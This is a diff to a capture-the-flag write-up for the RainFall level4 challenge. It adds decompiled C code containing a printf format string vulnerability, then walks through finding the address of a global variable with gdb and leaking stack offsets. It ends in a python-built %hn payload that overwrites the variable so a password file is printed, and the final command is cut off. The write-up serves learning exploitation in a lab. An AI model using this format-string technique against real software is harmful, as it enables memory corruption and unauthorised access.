@@ -1,8 +1,40 @@
+```
+    int m = 0;
+
+    int print_input(char* input)
+    {
+        return printf(input);
+    }
+
+    int check_and_run()
+    {
+        char buffer[512];
+
+        fgets(buffer, sizeof(buffer), stdin);
+
+        print_input(buffer);
+
+        int current_m = m;
+
+        if (current_m != 16930116) 
+        {
+            return current_m;
+        }
+
+        return system("/bin/cat /home/user/level5/.pass");
+    }
+
+    int main(int argc, char** argv, char** envp)
+    {
+        return check_and_run();
+    }
+```
+
 We have a global variable m is initialized to 0 if m == 16930116, the  check_and_run() function print the flag.
 
 and we have printf(input); a format string vulnerability to overwrite the global variable m with 16930116
 
-find the adress of m
+- find the adress of m
 
 ```
     (gdb) info variables
@@ -41,8 +73,7 @@ Upper 16-bit: 0x0102 => 258
 
 Lower 16-bit: 0x5544 => 21828
 
-
-geting the arguments in the stack:
+- geting the arguments in the stack:
 
 ```
     level4@RainFall:~$ ./level4 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
@@ -54,7 +85,8 @@ The arguments are 12 and 13
 Now, we need to write 0x5544 to 0x08049810 and 0x0102 to 0x08049812.
 
 first_padding = 21828 - 8 = 21820
-second_padding = (258 - 21828) % 65536 = 43966
+
+second_padding = (258 - 21828) % 65536 = 43966 (Want to write 21828 first (0x5544), then 258 (0x0102) — which is smaller, so wrap around using modulo 65536 (0xFFFF) because %hn writes a 2-byte (16-bit) integer (0 -> 65535))
 
 ```
     level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/h
